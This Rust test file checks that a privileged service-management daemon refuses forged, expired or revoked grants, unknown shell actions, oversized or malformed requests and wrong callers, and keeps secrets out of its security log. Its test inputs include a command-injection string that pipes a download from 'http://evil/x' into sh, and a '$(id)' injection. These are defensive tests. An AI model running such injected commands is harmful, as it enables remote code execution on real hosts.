//! Socket-layer tests (ENG.md test seam for the privileged executor).

mod common;

use common::{FakeExecutor, Harness, current_uid};
use hazelminx_privileged::action::{Action, PERM_HOST_INFO_READ, PERM_HOST_SERVICES_MANAGE};
use hazelminx_privileged::audit::SecurityEvent;
use hazelminx_privileged::client::ClientError;
use hazelminx_privileged::params::UnitName;
use hazelminx_privileged::protocol::{ErrorCode, MAX_REQUEST_BYTES, Request, Response};
use serde_json::json;
use std::sync::atomic::Ordering;
use std::time::Duration;
use tokio::time::timeout;

fn restart(unit: &str) -> Action {
    Action::RestartService {
        unit: UnitName::try_from(unit.to_string()).unwrap(),
    }
}

fn rejected_code(e: ClientError) -> ErrorCode {
    match e {
        ClientError::Rejected(b) => b.code,
        other => panic!("expected rejection, got {other}"),
    }
}

#[tokio::test]
async fn health_and_a_granted_action() {
    let h = Harness::start(FakeExecutor::default(), current_uid(), 2).await;
    let hr = h.client.health().await.unwrap();
    assert_eq!(hr.max_actions, 2);
    assert_eq!(hr.active_actions, 0);
    let g = h.grant("g-ok", &[PERM_HOST_INFO_READ]);
    let v = h
        .client
        .execute("r1", &g, &Action::SystemInfo {}, |_, _| {})
        .await
        .unwrap();
    assert_eq!(v["kind"], "system_info");
    let events = h.log.events();
    assert!(
        matches!(
            events.last(),
            Some(SecurityEvent::ActionExecuted { grant_id, ok: true, .. }) if grant_id == "g-ok"
        ),
        "{events:?}"
    );
}

#[tokio::test]
async fn container_read_only_grant_cannot_restart_services_or_get_a_shell() {
    let h = Harness::start(FakeExecutor::default(), current_uid(), 2).await;
    let g = h.grant("g-ro", &["containers.read"]);
    let e = h
        .client
        .execute("r1", &g, &restart("nginx.service"), |_, _| {})
        .await
        .unwrap_err();
    assert_eq!(rejected_code(e), ErrorCode::PermissionDenied);
    // No shell action exists at all, whatever the grant says.
    let g = h.grant("g-any", &["host.shell", PERM_HOST_SERVICES_MANAGE]);
    let frames = h
        .client
        .send_raw(
            serde_json::to_string(&Request::Action {
                request_id: "r2".into(),
                grant: g,
                action: json!({"kind": "shell", "cmd": "id"}),
            })
            .unwrap()
            .as_bytes(),
        )
        .await
        .unwrap();
    assert!(
        matches!(&frames[..], [Response::Error { error, .. }] if error.code == ErrorCode::UnknownAction),
        "{frames:?}"
    );
    assert_eq!(h.executor.started.load(Ordering::SeqCst), 0);
    let events = h.log.events();
    assert!(events.iter().any(|e| matches!(e, SecurityEvent::PermissionDenied { grant_id, required, .. } if grant_id == "g-ro" && required == PERM_HOST_SERVICES_MANAGE)), "{events:?}");
    assert!(events.iter().any(|e| matches!(e, SecurityEvent::ParamRejected { grant_id, action, .. } if grant_id == "g-any" && action == "shell")), "{events:?}");
}

#[tokio::test]
async fn bad_signature_expired_and_revoked_grants_are_refused_and_logged_without_secrets() {
    let h = Harness::start(FakeExecutor::default(), current_uid(), 2).await;
    let mut forged = h.grant("g-forged", &[PERM_HOST_INFO_READ]);
    forged.permissions.push(PERM_HOST_SERVICES_MANAGE.into());
    let e = h
        .client
        .execute("r1", &forged, &restart("nginx.service"), |_, _| {})
        .await
        .unwrap_err();
    assert_eq!(rejected_code(e), ErrorCode::GrantInvalid);

    let mut expired = h.grant("g-expired", &[PERM_HOST_INFO_READ]);
    expired.not_before -= time::Duration::hours(2);
    expired.expires_at -= time::Duration::hours(2);
    expired.sign(&h.issuer);
    let e = h
        .client
        .execute("r2", &expired, &Action::SystemInfo {}, |_, _| {})
        .await
        .unwrap_err();
    assert_eq!(rejected_code(e), ErrorCode::GrantInvalid);

    let g = h.grant("g-rev", &[PERM_HOST_INFO_READ]);
    h.client
        .execute("r3", &g, &Action::SystemInfo {}, |_, _| {})
        .await
        .unwrap();
    h.client.revoke("g-rev").await.unwrap();
    let e = h
        .client
        .execute("r4", &g, &Action::SystemInfo {}, |_, _| {})
        .await
        .unwrap_err();
    assert_eq!(rejected_code(e), ErrorCode::GrantInvalid);

    let events = h.log.events();
    let kinds: Vec<&str> = events
        .iter()
        .map(|e| match e {
            SecurityEvent::GrantRejected { reason, .. } => reason.as_str(),
            SecurityEvent::GrantRevoked { .. } => "revoked-event",
            SecurityEvent::ActionExecuted { .. } => "executed",
            _ => "other",
        })
        .collect();
    assert_eq!(
        kinds,
        [
            "bad_signature",
            "expired",
            "executed",
            "revoked-event",
            "revoked"
        ],
        "{events:?}"
    );
    let dump = serde_json::to_string(&events).unwrap();
    for secret in [
        forged.signature.as_str(),
        expired.signature.as_str(),
        g.signature.as_str(),
    ] {
        assert!(!dump.contains(secret), "signature leaked into security log");
        assert!(
            !dump.contains(&secret[..16]),
            "signature prefix leaked into security log"
        );
    }
}

#[tokio::test]
async fn parameter_rejection_is_logged_by_rule_not_value() {
    let h = Harness::start(FakeExecutor::default(), current_uid(), 2).await;
    let g = h.grant("g-p", &[PERM_HOST_SERVICES_MANAGE]);
    let hostile = "nginx.service\n$(curl http://evil/x | sh)";
    let frames = h
        .client
        .send_raw(
            serde_json::to_string(&Request::Action {
                request_id: "r1".into(),
                grant: g,
                action: json!({"kind": "restart_service", "unit": hostile}),
            })
            .unwrap()
            .as_bytes(),
        )
        .await
        .unwrap();
    assert!(
        matches!(&frames[..], [Response::Error { error, .. }] if error.code == ErrorCode::InvalidParam),
        "{frames:?}"
    );
    assert_eq!(h.executor.started.load(Ordering::SeqCst), 0);
    let dump = serde_json::to_string(&h.log.events()).unwrap();
    assert!(dump.contains("param_rejected"), "{dump}");
    assert!(
        !dump.contains("evil"),
        "rejected value leaked into security log: {dump}"
    );
}

#[tokio::test]
async fn type_mismatch_values_are_redacted_from_the_security_log() {
    let h = Harness::start(FakeExecutor::default(), current_uid(), 2).await;
    let g = h.grant("g-t", &[PERM_HOST_SERVICES_MANAGE]);
    let frames = h
        .client
        .send_raw(
            serde_json::to_string(&Request::Action {
                request_id: "r1".into(),
                grant: g,
                action: json!({"kind": "restart_service", "unit": 424242}),
            })
            .unwrap()
            .as_bytes(),
        )
        .await
        .unwrap();
    assert!(
        matches!(&frames[..], [Response::Error { error, .. }] if error.code == ErrorCode::InvalidParam),
        "{frames:?}"
    );
    let dump = serde_json::to_string(&h.log.events()).unwrap();
    assert!(dump.contains("param_rejected"), "{dump}");
    assert!(
        !dump.contains("424242"),
        "value leaked into security log: {dump}"
    );
    // The caller still gets the full parser message.
    assert!(
        matches!(&frames[..], [Response::Error { error, .. }] if error.message.contains("424242"))
    );
}

#[tokio::test]
async fn a_connection_that_never_sends_its_request_is_dropped() {
    let h = Harness::start(FakeExecutor::default(), current_uid(), 2).await;
    let mut stream = tokio::net::UnixStream::connect(h.client_path())
        .await
        .unwrap();
    use tokio::io::AsyncReadExt;
    let mut buf = [0u8; 8];
    let n = timeout(Duration::from_secs(3), stream.read(&mut buf))
        .await
        .expect("server kept the stalled connection open")
        .unwrap();
    assert_eq!(n, 0);
    assert!(matches!(
        h.log.events().as_slice(),
        [SecurityEvent::RequestRejected { .. }]
    ));
    // Still serving afterwards.
    h.client.health().await.unwrap();
}

#[tokio::test]
async fn revoke_only_accepts_token_shaped_ids() {
    let h = Harness::start(FakeExecutor::default(), current_uid(), 2).await;
    let e = h.client.revoke("not a token\n$(id)").await.unwrap_err();
    assert_eq!(rejected_code(e), ErrorCode::Malformed);
    assert!(matches!(
        h.log.events().as_slice(),
        [SecurityEvent::RequestRejected { .. }]
    ));
    h.client.revoke("g-1").await.unwrap();
}

#[tokio::test]
async fn wrong_caller_uid_is_refused_before_reading_anything() {
    let h = Harness::start(FakeExecutor::default(), current_uid().wrapping_add(1), 2).await;
    let e = h.client.health().await.unwrap_err();
    assert_eq!(rejected_code(e), ErrorCode::UnauthorizedCaller);
    let events = h.log.events();
    assert!(
        matches!(events.as_slice(), [SecurityEvent::CallerRejected { uid, .. }] if *uid == current_uid()),
        "{events:?}"
    );
}

#[tokio::test]
async fn malformed_and_oversized_requests_are_rejected_and_logged() {
    let h = Harness::start(FakeExecutor::default(), current_uid(), 2).await;
    let frames = h.client.send_raw(b"{not json").await.unwrap();
    assert!(
        matches!(&frames[..], [Response::Error { error, .. }] if error.code == ErrorCode::Malformed)
    );
    let big = format!(
        "{{\"type\":\"health\",\"pad\":\"{}\"}}",
        "x".repeat(MAX_REQUEST_BYTES)
    );
    let frames = h.client.send_raw(big.as_bytes()).await.unwrap();
    assert!(
        matches!(&frames[..], [Response::Error { error, .. }] if error.code == ErrorCode::RequestTooLarge),
        "{frames:?}"
    );
    let events = h.log.events();
    assert_eq!(events.len(), 2);
    assert!(
        events
            .iter()
            .all(|e| matches!(e, SecurityEvent::RequestRejected { .. }))
    );
}

#[tokio::test]
async fn saturated_slots_and_slow_readers_do_not_block_health_or_revocation() {
    // Two slots, both taken by actions that block until released and then
    // stream 8 MiB to a client that never reads.
    let h = Harness::start(
        FakeExecutor {
            block: true,
            stream_bytes: 8 * 1024 * 1024,
            ..Default::default()
        },
        current_uid(),
        2,
    )
    .await;
    let g1 = h.grant("g-slow-1", &[PERM_HOST_INFO_READ]);
    let g2 = h.grant("g-slow-2", &[PERM_HOST_INFO_READ]);
    let held1 = h
        .client
        .open(&Request::Action {
            request_id: "s1".into(),
            grant: g1.clone(),
            action: json!({"kind": "system_info"}),
        })
        .await
        .unwrap();
    let held2 = h
        .client
        .open(&Request::Action {
            request_id: "s2".into(),
            grant: g2,
            action: json!({"kind": "system_info"}),
        })
        .await
        .unwrap();
    // Wait until both actions are running, then let them start streaming
    // into connections nobody reads.
    timeout(Duration::from_secs(5), async {
        while h.executor.started.load(Ordering::SeqCst) < 2 {
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
    })
    .await
    .unwrap();
    h.executor.release.notify_waiters();
    tokio::time::sleep(Duration::from_millis(100)).await;

    let hr = timeout(Duration::from_secs(1), h.client.health())
        .await
        .expect("health timed out")
        .unwrap();
    assert_eq!(hr.active_actions, 2);
    timeout(Duration::from_secs(1), h.client.revoke("g-slow-1"))
        .await
        .expect("revoke timed out")
        .unwrap();
    // The revoked grant is refused immediately even though no slot is free.
    let e = timeout(
        Duration::from_secs(1),
        h.client
            .execute("s3", &g1, &Action::SystemInfo {}, |_, _| {}),
    )
    .await
    .expect("rejection timed out")
    .unwrap_err();
    assert_eq!(rejected_code(e), ErrorCode::GrantInvalid);
    // The producers are stalled by back-pressure, not buffering 8 MiB each.
    assert_eq!(h.executor.finished.load(Ordering::SeqCst), 0);
    drop(held1);
    drop(held2);
}

#[tokio::test]
async fn output_is_streamed_and_failures_become_action_failed() {
    let h = Harness::start(
        FakeExecutor {
            stream_bytes: 200 * 1024,
            ..Default::default()
        },
        current_uid(),
        2,
    )
    .await;
    let g = h.grant("g-s", &[PERM_HOST_INFO_READ]);
    let mut got = 0usize;
    let v = h
        .client
        .execute("r1", &g, &Action::SystemInfo {}, |_, chunk| {
            got += chunk.len()
        })
        .await
        .unwrap();
    assert_eq!(got, 200 * 1024);
    assert_eq!(v["streamed"], 200 * 1024);

    let h = Harness::start(
        FakeExecutor {
            fail_with: Some("systemctl exited with 1".into()),
            ..Default::default()
        },
        current_uid(),
        2,
    )
    .await;
    let g = h.grant("g-f", &[PERM_HOST_SERVICES_MANAGE]);
    let e = h
        .client
        .execute("r1", &g, &restart("nginx.service"), |_, _| {})
        .await
        .unwrap_err();
    assert_eq!(rejected_code(e), ErrorCode::ActionFailed);
    assert!(matches!(
        h.log.events().last(),
        Some(SecurityEvent::ActionExecuted { ok: false, .. })
    ));
}
